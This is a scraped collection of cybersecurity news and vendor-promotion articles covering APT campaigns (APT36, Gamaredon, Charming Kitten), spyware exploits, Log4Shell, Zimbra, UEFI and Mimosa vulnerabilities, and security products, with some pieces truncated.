'text': 'A politically motivated advanced persistent threat (APT) group has expanded its malware arsenal to include a new remote access trojan (RAT) in its espionage attacks aimed at Indian military and diplomatic entities.\nCalled CapraRAT by Trend Micro, the implant is an Android RAT that exhibits a high “degree of crossover“ with another Windows malware known as CrimsonRAT that’s associated with Earth Karkaddan, a threat actor that’s also tracked under the monikers APT36, Operation C-Major, PROJECTM, Mythic Leopard, and Transparent Tribe.\nThe first concrete signs of APT36’s existence appeared in 2016 as the group began distributing information-stealing malware through phishing emails with malicious PDF attachments targeting Indian military and government personnel. The group is believed to be of Pakistani origin and operational since at least 2013.\n\nThe threat actor is also known to be consistent in its modus operandi, with the attacks predominantly banking on social engineering and a USB-based worm as entry points. Among common elements in the group’s arsenal is a Windows backdoor called CrimsonRAT that allows the attackers extensive access to compromised systems, although recent campaigns have evolved to deliver ObliqueRAT.\n\nCrimsonRAT is fashioned as a .NET binary whose main purpose is to obtain and exfiltrate information from targeted Windows systems, including screenshots, keystrokes, and files from removable drives, and upload them to the attacker’s command-and-control server.\nThe new addition to its toolset is yet another custom Android RAT that’s deployed by means of phishing links. CapraRAT, which is disguised as a YouTube app, is said to be a modified version of an open-source RAT called AndroRAT and comes with a variety of data exfiltration functions, including the ability to harvest victims’ locations, phone logs, and contact information.\n\nThis is far from the first time the hacking group has used Android RATs. In May 2018, human rights defenders in Pakistan were targeted by Android spyware named StealthAgent to intercept phone calls and messages, siphon photos, and track their whereabouts.\nThen in 2020, attack campaigns mounted by Transparent Tribe involved leveraging military-themed lures to drop a modified version of the AhMyth Android RAT that masqueraded as a porn-related app and a fake version of the Aarogya Setu COVID-19 tracking app.\nTo mitigate such attacks, users are advised to watch out for unsolicited emails, avoid clicking on links or downloading email attachments from unknown senders, install apps only from trusted sources, and exercise caution when it comes to granting permissions requested by the apps.\n\n\nFound this article interesting?

'text': 'Systems hosting content pertaining to the National Games of China were successfully breached last year by an unnamed Chinese-language-speaking hacking group.\nCybersecurity firm Avast, which dissected the intrusion, said that the attackers gained access to a web server 12 days prior to the start of the event on September 3 to drop multiple reverse web shells for remote access and achieve permanent foothold in the network.\nThe National Games of China, a multi-sport event held every four years, took place in the Shaanxi Province between September 15 and 27, 2021.\n\nThe Czech company said it was unable to determine the nature of the information stolen by the hackers, adding it has “reason to believe [the attackers] are either native Chinese-language speakers or show high fluency in Chinese.“ The breach is said to have been resolved ahead of the start of the games.\nThe initial access was facilitated by exploiting a vulnerability in the webserver. But before dropping the web shells, the adversary also experimented with the type of files that they were able to upload to the server, only to follow it up with submitting executable code that masqueraded as seemingly harmless image files.\n\nAdditionally, attempts were made to reconfigure the server to execute the Behinder web shell, failing which the operators “uploaded and ran an entire Tomcat server properly configured and weaponized“ with the post-exploitation tool.\n“After gaining access, the attackers tried to move through the network using exploits and bruteforcing services in an automated way,“ Avast researchers David Álvarez Pérez and Jan Neduchal said.\n\nAmong other tools uploaded to the server included a network scanner and a custom one-click exploitation framework written in Go that enabled the threat actor to carry out lateral movement and autonomously break into other devices within the same network.\n“Go is a programming language becoming more and more popular which can be compiled for multiple operating systems and architectures, in a single binary self-containing all dependencies,“ the researchers said, calling out the increasing use of Go-based malware to conduct cyber attacks.\n“So we expect to see malware and grey tools written in this language in future attacks, especially in [Internet of things] attacks where a broad variety of devices leveraging different kinds of processor architectures are involved.“\n\n\nFound this article interesting?

{'title': 'IoT/connected Device Discovery and Security Auditing in Corporate Networks',
'text': 'Today’s enterprise networks are complex environments with different types of wired and wireless devices being connected and disconnected. The current device discovery solutions have been mainly focused on identifying and monitoring servers, workstation PCs, laptops and infrastructure devices such as network firewalls, switches and routers, because the most valuable information assets of organizations are being stored, processed and transferred over those devices, hence making them the prime target of security breaches and intrusions.\nHowever, a new trend has been emerging in the past four years, where attackers have been targeting purpose-built connected devices such as network printers and video conferencing systems as an entry point and data exfiltration route.\nThese devices cannot be identified properly by the current IT asset discovery solutions for the following main reasons:\nProprietary protocols are often used for managing and monitoring such devices that are not known to the asset discovery solution.Agent-based asset discovery is not possible because most of the connected devices are resource-constrained systems with proprietary operating systems that do not allow the installation of discovery agent software on them.\nFirmalyzer’s IoT vulnerability assessment solution (IoTVAS) overcomes these limitations and provides:\nAccurate identification of connected device manufacturer, model name, device type, device end of life status, firmware version, and firmware release dateReal-time Firmware bill of materials (BOM) report that lists software components and libraries inside the firmware code of each device without requiring the user to upload device firmware files. Identification of publicly unknown vulnerabilities of the device that includes vulnerable 3rd party components, default credentials, crypto keys, certificates, and default configuration issuesIdentification of the publicly known vulnerabilities (CVEs) of the device\nIoTVAS can operate as a standalone IoT discovery and risk assessment solution or be integrated into existing IT asset discovery, network port scanners, and IT vulnerability scanning tools via IoTVAS REST API. \nIoT Discovery with IoTVAS\nIoTVAS identifies devices based on fingerprints derived from device network service banners. The device MAC address can also be used together with this fingerprint to improve detection accuracy, but it is not a requirement for IoTVAS, unlike the other device discovery solutions. New device fingerprints are continuously added to the IoTVAS fingerprints database, based on the incoming API request and in-house research.\nAt the time of writing this article, this database contains over 50,000 fingerprints for more than 2,300 device manufacturers. IoTVAS uses the following network service response and banners for fingerprint generation:\nSysDescr OID string of the SNMP serviceSysObjectID OID string of the SNMP serviceFTP service bannerTelnet service bannerDevice hostnameRaw response of the device webserver (http and HTTPS services)UPnP discovery responseOptional MAC address of device network interface\nIoTVAS would need at least one of the above features for identifying an IoT device. Network service banners can be collected by existing network port scanners or IT vulnerability scanners.\nIn the standalone mode, IoTVAS uses a lightweight network service identification software that probes devices on the target network to extract the aforementioned features. IoTVAS device discovery capability can also be integrated into the existing security tools via a REST API endpoint.\nIoT security Audit with IoTVAS\nOnce a device maker, model and firmware version were identified, IoTVAS goes beyond just looking up the CVEs associated with the device and firmware version. Using Firmalyzer’s proprietary firmware risk knowledge base, IoTVAS retrieves firmware bill of materials and detailed risk analysis that includes vulnerable 3rd party components in the firmware in the following categories: “network services“ (UPnP server, web server, etc.), “crypto libraries“ (OpenSSL, GnuTLS, etc.), “Linux OS kernel“ and “client tools“ (busybox, etc.).\nIoTVAS also provides a list of default credentials, crypto keys embedded in the device firmware, active and expired digital certificates, weak crypto keys and certificates, and default configuration issues. This in-depth information enables security managers to proactively detect high-risk connected devices in the network and initiate mitigation efforts before these devices get compromised. This also automates the process of BOM inventory of IoT and embedded devices in the organization by eliminating the need for manual firmware download and firmware binary analysis for various IoT devices deployed in enterprise networks. \nSimilar to the device discovery capability, IoTVAS firmware risk assessment is also accessible via a REST API endpoint.\nIoTVAS in Action\nThe following figure shows the risk assessment report of a Xerox network printer in the IoTVAS SaaS edition, including the firmware BOM and vulnerability details of software components. \nFigure 1 - Device risk details page in IoTVAS SaaS\nIoTVAS API enables IT security solution providers and SecOps teams to integrate IoTVAS discovery and IoT risk audit capabilities into their existing tools and offerings. As an example, Firmalyzer developed IoTVAS plugin for the NMAP scanner that enables it to accurately discover and audit IoT devices while scanning a target network.\nThe next example shows how IoTVAS NSE scripts enable NMAP to accurately detect the maker, model name, the firmware version of an enterprise printer, along with its known CVEs and firmware risks. The firmware risk analysis reveals “root“ and “postgres“ default accounts and credentials for the “intFTP“ account, a list of expired certificates and certificates with weak fingerprinting algorithm (MD5) and a default configuration of SSH daemon that allows remote root login.\nFigure 2 - IoTVAS plugin for NMAP\nTo get started with IoTVAS API, please register for a trial API key. The API documentation page includes a swagger UI that allows you to evaluate IoTVAS endpoints right from your browser without writing any code\nIf you are interested in a demo of the IoTVAS SaaS or customization, don’t hesitate to get in touch with Firmalyzer for a live demonstration or a test account.\n\n\nFound this article interesting?

{'title': 'Microsoft Uncovers New Details of Russian Hacking Campaign Targeting Ukraine',
'text': 'Microsoft on Friday shared more of the tactics, techniques, and procedures (TTPs) adopted by the Russia-based Gamaredon hacking group to facilitate a barrage of cyber espionage attacks aimed at several entities in Ukraine over the past six months.\nThe attacks are said to have singled out government, military, non-government organizations (NGO), judiciary, law enforcement, and non-profit organizations with the main goal of exfiltrating sensitive information, maintaining access, and leveraging it to move laterally into related organizations.\nThe Windows maker’s Threat Intelligence Center (MSTIC) is tracking the cluster under the moniker ACTINIUM (previously as DEV-0157), sticking to its tradition of identifying nation-state activities by chemical element names.\nThe Ukrainian government, in November 2021, publicly attributed Gamaredon to the Russian Federal Security Service (FSB) and connected its operations to the FSB Office of Russia in the Republic of Crimea and the city of Sevastopol.\n\n“Since October 2021, ACTINIUM has targeted or compromised accounts at organizations critical to emergency response and ensuring the security of Ukrainian territory, as well as organizations that would be involved in coordinating the distribution of international and humanitarian aid to Ukraine in a crisis,“ MSTIC researchers said.\nIt’s worth pointing out that the Gamaredon threat group represents a unique set of attacks divorced from last month’s cyber offensives that knocked out multiple Ukraine government agencies and corporate entities with destructive data-wiping malware disguised as ransomware.\nThe attacks primarily leverage spear-phishing emails as an initial access vector, with the messages carrying malware-laced macro attachments that employ remote templates containing malicious code when the recipients open the rigged documents.\n\nIn an interesting tactic, the operators also embed a tracking pixel-like “web bug“ within the body of the phishing message to monitor if a message has been opened, following which, the infection chain triggers a multi-stage process that culminates in the deployment of several binaries, including —\nPowerPunch – A PowerShell-based dropper and downloader used to retrieve the next-stage executables remotelyPterodo – A constantly evolving feature-rich backdoor that also sports a range of capabilities intended to make analysis more difficult, andQuietSieve – A heavily-obfuscated .NET binary specifically geared towards data exfiltration and reconnaissance on the target host\n\n“While the QuietSieve malware family is primarily geared towards the exfiltration of data from the compromised host, it can also receive and execute a remote payload from the operator,“ the researchers explained, while also calling out its ability to take screenshots of the compromised host about every five minutes.\nThis is far from the only intrusion staged by the threat actor, which also struck an unnamed Western government organization in Ukraine last month via a malware-laced resume for an active job listing with the entity posted on a local job portal. It also targeted the country’s State Migration Service (SMS) in December 2021.\nThe findings also arrive as Cisco Talos, in its continuing analysis of the January incidents, disclosed details of an ongoing disinformation campaign attempting to attribute the defacement and wiper attacks to Ukrainian groups that date back at least nine months.\n\n\nFound this article interesting?

'text': 'A now-patched security vulnerability in Apple iOS that was previously found to be exploited by Israeli company NSO Group was also separately weaponized by a different surveillance vendor named QuaDream to hack into the company’s devices.\nThe development was reported by Reuters, citing unnamed sources, noting that “the two rival businesses gained the same ability last year to remotely break into iPhones [and] compromise Apple phones without an owner needing to open a malicious link.“\nThe zero-click exploit in question is FORCEDENTRY, a flaw in iMessage that could be leveraged to circumvent iOS security protections and install spyware that allowed attackers to scoop up a wealth of information such as contacts, emails, files, messages, and photos, as well as access to the phone’s camera and microphone.\n\nGoogle Project Zero, which studies zero-day vulnerabilities in hardware and software systems such as operating systems, web browsers, and open source libraries, called FORCEDENTRY (CVE-2021-30860, CVSS score: 7.8) “one of the most technically sophisticated exploits.“\nQuaDream’s spyware, named REIGN, functions in a manner similar to NSO Group’s Pegasus, granting its users full control of the device. Apple addressed the underlying defect in September 2021 and later sued NSO Group for abusing the exploit to attack iPhones with surveillanceware.\nThe disclosure comes as The New York Times released an eye-opening report late last month highlighting the use of Pegasus by the Central Intelligence Agency (CIA) to help combat terrorism in Djibouti as well as its purchase by a number of countries, including India, Mexico, Saudi Arabia, and the U.A.E.\nThe yearlong investigation also revealed that the U.S. Federal Bureau of Investigation (FBI) “bought and tested NSO software for years with plans to use it for domestic surveillance until the agency finally decided last year not to deploy the tools.“\nOn top of that, the new system, dubbed Phantom, is believed to have been equipped with capabilities to target phone numbers located in the U.S., going against the company’s previous claims that its spyware cannot be used on phone numbers with a +1 country code.\nEarlier this week, the FBI confirmed to The Washington Post that it had indeed procured a license to use the tool and test its capabilities on phones using foreign SIM cards. However, the agency added that it used the product “for product testing and evaluation only,“ and that it never used it operationally or to support any investigation.\n\nNSO Group, which was also blocklisted by the U.S. government in November 2021, has been besieged by numerous setbacks in recent months, what with its spyware linked to numerous instances of political surveillance targeting diplomats and government officials in Finland, Poland, and the U.S.\n“The continuous revelations around the advanced spyware programs over the last year show the world just how much development is behind sophisticated mobile attacks,“ said Richard Melick, director of product strategy at Zimperium. “These attacks are not just one vulnerability and exploit; they encompass fully developed toolsets designed to deliver the most effective spyware for its customers coming from known and unknown organizations.“\n“While lacking advanced threat detection solutions, the mobile phone’s continuous connections with personal and critical data systems make it a lucrative target for any malicious organization and its customers,“ Melick added.\n\n\nFound this article interesting?

'text': 'Most security practitioners are now aware of the Log4Shell vulnerability discovered toward the end of 2021. No one knows how long the vulnerability existed before it was discovered. The past couple of months have had security teams scrambling to patch the Log4Shell vulnerability found in Apache Log4j, a Java library widely used to log error messages in applications. Beyond patching, it’s helpful and instructive for security practitioners to have a deeper understanding of this most recent critical vulnerability.\nFortunately, Cynet Senior Security Researcher Igor Lahav is hosting a webinar [Register here] to provide “buzzword free“ insights into Log4Shell. Based on a webinar preview provided by Cynet, the discussion will cover the software bugs in Apache Log4j that permitted the critical vulnerability, the exploits used to take advantage of the vulnerabilities and the remediation options available to protect your organization. This webinar will help make sense of the sometimes overly technical analysis of Log4Shell we’ve been subject to over the past couple of months.\n— What is Log4j?\nBefore you can really grasp the magnitude of the Log4Shell vulnerability, it’s necessary to understand the underlying technology. The Cynet webinar steps through what the Log4j library is and how it’s used in Java. It also explains a feature used by the logging system called Java Naming Directory Interface (JDNI) and how it is used by log4j to help understand the vulnerability.\n— The Vulnerabilities\nThe root cause of this vulnerability is the way Log4j processes log messages, and the webinar clearly steps through the software bugs that made the Log4j logging mechanism vulnerable to attackers. This includes a description of how JNDI injection works and why it can lead to issues as well as what remote Log4j configuration is and how attackers can leverage it to gain access.\n— The Exploits \nExactly how do attackers take advantage of the Log4j vulnerabilities? Cynet shares the step-by-step attacks they’ve seen in the wild, which indicate a high level of attacker expertise. They demonstrate how attackers bypass static detections, how they achieve remote code execution by bypassing two common checking functions (allowedLdapClasses and allowedLdapHosts).\n— The Mitigations\nFinally, Cynet steps through the mitigation actions companies should take, including locating vulnerable applications, patching options, important configuration changes and patching 3rd party applications. You will also learn about the Cynet Log4Shell exploit detections in Windows and Linux.\nWrapping Up\nCynet will also share discoveries from several recent incident response investigations, such as active exploitations of the Log4Shell vulnerability on VMware Horizon Servers by different threat actors who deployed Cobalt Strike beacons, Cryptominers, and fileless reverse shells.

'text': 'The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Thursday published an Industrial Controls Systems Advisory (ICSA) warning of multiple vulnerabilities in the Airspan Networks Mimosa equipment that could be abused to gain remote code execution, create a denial-of-service (DoS) condition, and obtain sensitive information.\n“Successful exploitation of these vulnerabilities could allow an attacker to gain user data (including organization details) and other sensitive data, compromise Mimosa’s AWS (Amazon Web Services) cloud EC2 instance and S3 Buckets, and execute unauthorized remote code on all cloud-connected Mimosa devices,“ CISA said in the alert.\n\nThe seven flaws, which were discovered and reported to CISA by industrial cybersecurity company Claroty, affect the following products —\nMimosa Management Platform (MMP) running versions prior to v1.0.3Point-to-Point (PTP) C5c and C5x running versions prior to v2.8.6.1, andPoint-to-Multipoint (PTMP) A5x and C-series (C5c, C5x, and C6x) running versions prior to v2.5.4.1\nAirspan Network’s Mimosa product line provides hybrid fiber-wireless (HFW) network solutions to service providers, industrial, and government operators for both short and long-range broadband deployments.\nThe critical bugs are part of seven total vulnerabilities, three of which are rated 10 out of 10 on the CVSS vulnerability-severity scale, effectively enabling an adversary to execute arbitrary code, access secret keys, and even modify configurations.\nFour other remaining flaws could allow an attacker to inject arbitrary commands, crack hashed (but not salted) passwords, and gain unauthorized access to sensitive information.\nTo mitigate the defects, users are recommended to update to MMP version 1.0.4 or higher, PTP C5c and C5x version 2.90 or higher, and PTMP A5x and C-series version 2.9.0 or higher.\nIn addition, CISA is advising vulnerable organizations to minimize network exposure, isolate control system networks from the business network, and use virtual private networks (VPNs) for remote access to mitigate the risk of exploitation of these vulnerabilities.\n\nThe disclosure also comes as Cisco Talos published details on a series of critical vulnerabilities that Sealevel has addressed in the SeaConnect 370W Wi-Fi-connected edge device, which could allow an attacker to conduct a man-in-the-middle (MitM) attack and execute remote code on the targeted device.\nUpdate: In a statement shared with The Hacker News, Jaime Fink, Airspan VP of technology, said —\nThe issue was identified in August 2021 by a security vulnerability research team, and reported to Airspan via our Security Incident Response Team (SIRT) procedures. We immediately addressed and rapidly resolved these issues via firmware and software updates to our user’s devices, servers, and Airspan’s cloud platforms — through the proper channel via the CISA announcement and Airspan rectification response.\nThe identified device issues would require multiple security layers which greatly reduced any potential vulnerability (knowledge of device password or breach, as well as private network access) as well as vulnerability know-how. All systems were fixed months ago and users provided with the vulnerability information in the subsequent releases.\nOur customers should be confident that we take data security seriously and promptly addressed the issue last year. We will continue to deliver the same secure, quality portfolio of solutions to our customers as we have for the past 20 years.\n\n\nFound this article interesting?

'text': 'A threat actor, likely Chinese in origin, is actively attempting to exploit a zero-day vulnerability in the Zimbra open-source email platform as part of spear-phishing campaigns that commenced in December 2021.\nThe espionage operation — codenamed “EmailThief“ — was detailed by cybersecurity company Volexity in a technical report published Thursday, noting that successful exploitation of the cross-site scripting (XSS) vulnerability could result in the execution of arbitrary JavaScript code in the context of the user’s Zimbra session.\n\nVolexity attributed the intrusions, which started on December 14, 2021, to a previously undocumented hacking group it’s tracking under the moniker TEMP_HERETIC, with the assaults aimed at European government and media entities. The zero-day bug impacts the most recent open-source edition of Zimbra running version 8.8.15.\n\nThe attacks are believed to have occurred in two phases; the first stage aimed at reconnaissance and distributing emails designed to keep tabs if a target received and opened the messages. In the subsequent stage, multiple waves of email messages were broadcasted to trick the recipients into clicking a malicious link.\nIn total, 74 unique outlook.com email addresses were created by the attacker to send out the missives over a period of two weeks, among which the initial recon messages contained generic subject lines ranging from invitations to charity auctions to refunds for airline tickets.\n“For the attack to be successful, the target would have to visit the attacker’s link while logged into the Zimbra webmail client from a web browser,“ Steven Adair and Thomas Lancaster noted. “The link itself, however, could be launched from an application to include a thick client, such as Thunderbird or Outlook.“\n\nThe unpatched flaw, should it be weaponized, could be abused to exfiltrate cookies to allow persistent access to a mailbox, send phishing messages from the compromised email account to widen the infection, and even facilitate the download of additional malware.\n\n“None of the infrastructure identified […] exactly matches infrastructure used by previously classified threat groups,“ the researchers said. “However, based on the targeted organization and specific individuals of the targeted organization, and given the stolen data would have no financial value, it is likely the attacks were undertaken by a Chinese APT actor.“\n“Users of Zimbra should consider upgrading to version 9.0.0, as there is currently no secure version of 8.8.15,“ the company added.\n\n\nFound this article interesting?

The malware then acts as a stepping stone for gaining further insight into the targeted organization by downloading next-stage executables that propagate the multi-stage infection chain.\n\nOne of those executables is a tampered version of an internal component of Microsoft Windows that’s appended with a malicious VBScript. The attack subsequently leverages a technique called signed binary proxy execution to run the DLL file using the legitimate “Mshta.exe“ utility.\n\nThis results in the execution of the VBScript code, effectively triggering the next phase of the attack wherein additional payloads such as Atera Agent, Cobalt Strike Beacon, and Ursnif are delivered in the later stages to help perform remote reconnaissance, privilege escalation, and credential harvesting.\n\nWhat’s more, in a sign that the operators experimented with different ploys, an alternative variant of the same campaign delivered the Atera remote monitoring management software directly as a consequence of the initial compromise for further follow-on post-exploitation activities.\nMandiant also called out the attacks’ overlaps with that of techniques adopted by the Conti ransomware gang, which were publicized in August 2021. “At this time, due to the public release of this information, other unaffiliated actors may be replicating the techniques for their own motives and objectives,“ the researchers said.\n\n\nFound this article interesting?

'text': 'An accountant and a security expert walk into a bar… SOC2 is no joke. \nWhether you’re a publicly held or private company, you are probably considering going through a Service Organization Controls (SOC) audit. For publicly held companies, these reports are required by the Securities and Exchange Commission (SEC) and executed by a Certified Public Accountant (CPA). However, customers often ask for SOC2 reports as part of their vendor due diligence process. \nOut of the three types of SOC reports, SOC2 is the standard to successfully pass regulatory requirements and signals high security and resilience within the organization — and is based on the American Institute of Certified Public Accountants (AICPA) attestation requirements. The purpose of this report is to evaluate an organization’s information systems relevant to security, availability, processing integrity, confidentiality, and privacy — over a period of time (roughly six to twelve months). \nAs part of a SOC2 audit, it is necessary to conduct security checks across the company’s SaaS stack that will look for misconfigured settings such as detection and monitoring to ensure continued effectiveness of information security controls and prevent unauthorized/ inappropriate access to physical and digital assets and locations.\nIf you’re beginning or on a SOC2 audit journey, then an SSPM (SaaS Security Posture Management) solution can streamline the process and shorten the time it takes to pass a SOC2 audit successfully, fully covering your SaaS Security posture. \nLearn how to streamline your organization’s SOC2 compliance \nWhat are the AICPA Trust Services Criteria (TSC)?\nWhen external auditors engage in a SOC 2 audit, they need to compare what you’re doing to a long list of established requirements from AICPA TSC.

{'title': 'Cynet’s Keys to Extend Threat Visibility',
'text': 'We hear about the need for better visibility in the cybersecurity space – detecting threats earlier and more accurately. We often hear about the dwell time and the time to identify and contain a data breach. Many of us are familiar with IBM’s Cost of a Data Breach Report that has been tracking this statistic for years. In the 2021 report, IBM found that, on average, it takes an average of 212 days to identify a breach and then another 75 days to contain the breach, for a total of 287 days.\nA new solution overview document provides insights on how XDR provider Cynet tackles the difficult problem of greatly improving threat visibility. Cynet takes a modern approach that includes a greater level of native technology integration and advanced automation purposely designed for organizations with smaller security teams than Fortune 500 organizations. A live webinar will discuss the same topic (Register here)\nCynet’s Keys for Threat Visibility\nEinstein said that the definition of insanity is doing the same thing over and over while expecting a different outcome. The old approach to threat visibility involving multiple protection technologies and trying to sift through a sea of alerts and information is obviously not working well. Cynet’s different – and seemingly saner – approach to prevent, detect, and respond to modern-day threats involves several integrated capabilities.\nAccording to the new Cynet solution overview, the following key technologies are used to provide extended threat visibility along with enhanced response capabilities. \nInclude Multiple Threat Detection Technologies \nCynet includes multiple prevention and detection technologies, all natively orchestrated in the platform:\nNGAV – Fundamental endpoint protection based on known bad signatures and behaviors.EDR – To detect and prevent more complex endpoint threats that bypass NGAV solutions.NTA – To detect threats that have made their way into the network and so-called lateral movement.UBA – To detect unusual activity that could signal stolen credentials, a rogue insider, or bots.Deception – To uncover intrusions that have bypassed other detection technologiesCLM – To mine the extensive log data generated by IT systems.SSPM – To find and correct configuration errors in SaaS applications.\nCoordinate All Signals\nMaking sense out of multiple detection technologies by integrating, coordinating, and prioritizing information was supposed to be the realm of Security Incident and Event Management (SIEM) technologies. Unfortunately, SIEM doesn’t do well with real-time data and requires significant care and feeding.\nXDR solutions, like Cynet’s, are purpose-built to integrate real-time signals from multiple points of telemetry on a single platform. Cynet even includes an Incident Engine that automatically investigates threats to determine the attack’s full scope and root cause. \nAutomate All Response Actions \nQuickly and accurately identifying threats is a game-changer. The ability to automatically and fully eradicate identified threats is, well, a game-changer changer. This means security teams won’t have to be burdened with lengthy investigations, which many don’t have the time or skills to undertake. Cynet provides an extensive set of remediation actions across files, hosts, networks and users as well as remediation playbooks that can be configured to be invoked manually or automatically. \nProvide Full MDR Oversight\nBeyond the technology platform, Cynet offers all clients a full, 24x7 MDR service at no additional cost. This team continuously monitors client environments to ensure nothing dangerous is overlooked or mishandled. Having an expert team watching out for issues should put smaller organizations with smaller security teams at ease, knowing an expert team of cybersecurity experts has their backs. \nIn With the New\nWith the time required to identify and contain data breaches steadily increasing, we need to rethink the traditional cybersecurity approach. It seems companies keep throwing more money, more technology, and more bodies at the problem, yet achieving the same (or worse) results. Cynet is one company that seems to be approaching the problem differently by combining multiple prevention, detection, response, and automation capabilities on a single, unified breach protection platform. Rather than buying all this stuff separately and munging it all together, the Cynet platform seems to expand and improve threat visibility out of the box. \nDownload the solution brief here.\n\n\nFound this article interesting?

'text': 'As many as 23 new high severity security vulnerabilities have been disclosed in different implementations of Unified Extensible Firmware Interface (UEFI) firmware used by numerous vendors, including Bull Atos, Fujitsu, HP, Juniper Networks, Lenovo, among others.\nThe vulnerabilities reside in Insyde Software’s InsydeH2O UEFI firmware, according to enterprise firmware security company Binarly, with a majority of the anomalies diagnosed in the System Management Mode (SMM).\nUEFI is a software specification that provides a standard programming interface connecting a computer’s firmware to its operating system during the booting process. In x86 systems, the UEFI firmware is usually stored in the flash memory chip of the motherboard.\n\n“By exploiting these vulnerabilities, attackers can successfully install malware that survives operating system re-installations and allows the bypass of endpoint security solutions (EDR/AV), Secure Boot, and Virtualization-Based Security isolation,“ the researchers said.\nSuccessful exploitation of the flaws (CVSS scores: 7.5 - 8.2) could allow a malicious actor to run arbitrary code with SMM permissions, a special-purpose execution mode in x86-based processors that handles power management, hardware configuration, thermal monitoring, and other functions.\n\n“SMM code executes in the highest privilege level and is invisible to the OS, which makes it an attractive target for malicious activity,“ Microsoft notes in its documentation, adding the SMM attack vector could be abused by a piece of nefarious code to trick another code with higher privileges into performing unauthorized activities.\n\nWorse, the weaknesses can also be chained together to bypass security features and install malware in a manner that survives operating system re-installations and achieve long-term persistence on compromised systems — as observed in the case of MoonBounce — while stealthily creating a communications channel to exfiltrate sensitive data.\nInsyde has released firmware patches that address these shortcomings as part of the coordinated disclosure process.

Subsequent infection chains documented by Morphisec in September 2021 highlighted the use of MSI installers to ensure the delivery of the malware.\nThe SolarMarker modus operandi commences with redirecting victims to decoy sites that drop the MSI installer payloads, which, while executing seemingly legitimate install programs such as Adobe Acrobat Pro DC, Wondershare PDFelement, or Nitro Pro, also launches a PowerShell script to deploy the malware.\n\n“These SEO efforts, which leveraged a combination of Google Groups discussions and deceptive web pages and PDF documents hosted on compromised (usually WordPress) websites, were so effective that the SolarMarker lures were usually at or near the top of search results for phrases the SolarMarker actors targeted,“ Sophos researchers Gabor Szappanos and Sean Gallagher said in a report shared with The Hacker News.\nThe PowerShell installer is designed to alter the Windows Registry and drop a .LNK file into Windows’ startup directory to establish persistence. This unauthorized change results in the malware getting loaded from an encrypted payload hidden amongst what the researchers called a “smokescreen“ of 100 to 300 junk files created specifically for this purpose.\n“Normally, one would expect this linked file to be an executable or script file,“ the researchers detailed. “But for these SolarMarker campaigns the linked file is one of the random junk files, and cannot be executed itself.“\n\nWhat’s more, the unique and random file extension used for the linked junk file is utilized to create a custom file type key, which is ultimately employed to execute the malware during system startup by running a PowerShell command from the Registry.\nThe backdoor, for its part, is ever-evolving, featuring an array of functionalities that allow it to steal information from web browsers, facilitate cryptocurrency theft, and execute arbitrary commands and binaries, the results of which are exfiltrated back to a remote server.\n“Another important takeaway […], which was also seen in the ProxyLogon vulnerabilities targeting Exchange servers, is that defenders should always check whether attackers have left something behind in the network that they can return to later,“ Gallagher said. “For ProxyLogon this was web shells, for SolarMarker this is a stealthy and persistent backdoor that according to Sophos telematics is still active months after the campaign ended.“\n\n\nFound this article interesting?

'text': 'An advanced persistent threat group with links to Iran has updated its malware toolset to include a novel PowerShell-based implant called PowerLess Backdoor, according to new research published by Cybereason.\nThe Boston-headquartered cybersecurity company attributed the malware to a hacking group known as Charming Kitten (aka Phosphorous, APT35, or TA453), while also calling out the backdoor’s evasive PowerShell execution.\n“The PowerShell code runs in the context of a .NET application, thus not launching ’powershell.exe’ which enables it to evade security products,“ Daniel Frank, senior malware researcher at Cybereason, said. “The toolset analyzed includes extremely modular, multi-staged malware that decrypts and deploys additional payloads in several stages for the sake of both stealth and efficacy.“\n\nThe threat actor, which is active since at least 2017, has been behind a series of campaigns in recent years, including those wherein the adversary posed as journalists and scholars to deceive targets into installing malware and stealing classified information.\n\nEarlier this month, Check Point Research disclosed details of an espionage operation that involved the hacking group exploiting the Log4Shell vulnerabilities to deploy a modular backdoor dubbed CharmPower for follow-on attacks.\nThe latest refinements to its arsenal, as spotted by Cybereason, constitutes an entirely new toolset that encompasses the PowerLess Backdoor, which is capable of downloading and executing additional modules such as a browser info-stealer and a keylogger.\n\nAlso potentially linked to the same developer of the backdoor are a number of other malware artifacts, counting an audio recorder, an earlier variant of the information stealer, and what the researchers suspect to be an unfinished ransomware variant coded in .NET.\nFurthermore, infrastructure overlaps have been identified between the Phosphorus group and a new ransomware strain called Memento, which first emerged in November 2021 and took the unusual step of locking files within password-protected archives, followed by encrypting the password and deleting the original files, after their attempts to encrypt the files directly were blocked by endpoint protection.\n“The activity of Phosphorus with regard to ProxyShell took place in about the same time frame as Memento,“ Frank said. “Iranian threat actors were also reported to be turning to ransomware during that period, which strengthens the hypothesis that Memento is operated by an Iranian threat actor.“\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers on Monday said they uncovered evidence of attempted attacks by a Russia-linked hacking operation targeting a Ukrainian entity in July 2021.\nBroadcom-owned Symantec, in a new report published Monday, attributed the attacks to an actor tracked as Gamaredon (aka Shuckworm or Armageddon), a cyber-espionage collective known to be active since at least 2013.\nIn November 2021, Ukrainian intelligence agencies branded the group as a “special project“ of Russia’s Federal Security Service (FSB), in addition to pointing fingers at it for carrying out over 5,000 cyberattacks against public authorities and critical infrastructure located in the country.\nGamaredon attacks typically originate with phishing emails that trick the recipients into installing a custom remote access trojan called Pterodo. Symantec disclosed that, between July 14, 2021 and August 18, 2021, the actor installed several variants of the backdoor as well as deployed additional scripts and tools.\n\n“The attack chain began with a malicious document, likely sent via a phishing email, which was opened by the user of the infected machine,“ the researchers said. The identity of the affected organization was not disclosed.\nTowards the end of July, the adversary leveraged the implant to download and run an executable file that acted as a dropper for a VNC client before establishing connections with a remote command-and-control server under their control.\n“This VNC client appears to be the ultimate payload for this attack,“ the researchers noted, adding the installation was followed by accessing a number of documents ranging from job descriptions to sensitive company information on the compromised machine.\nUkraine Calls Out False Flag Operation in Wiper Attacks\nThe findings come amidst a wave of disruptive and destructive attacks levied against Ukrainian entities by alleged Russian state-sponsored actors, resulting in the deployment of a file wiper dubbed WhisperGate, around the same time multiple websites belonging to the government were defaced.\n\nSubsequent investigation into the malware has since revealed that the code used in the wiper was re-purposed from a faux ransomware campaign called WhiteBlackCrypt that was aimed at Russian victims in March 2021.\nInterestingly, the ransomware is known to include a trident symbol — that is part of Ukraine’s coat of arms — in the ransom note it displays to its victims, leading Ukraine to suspect that this may have been a false flag operation deliberately intended to blame a “fake“ pro-Ukrainian group for staging an attack on their own government.\n\n\nFound this article interesting?

{'title': 'Reasons Why Every Business is a Target of DDoS Attacks',
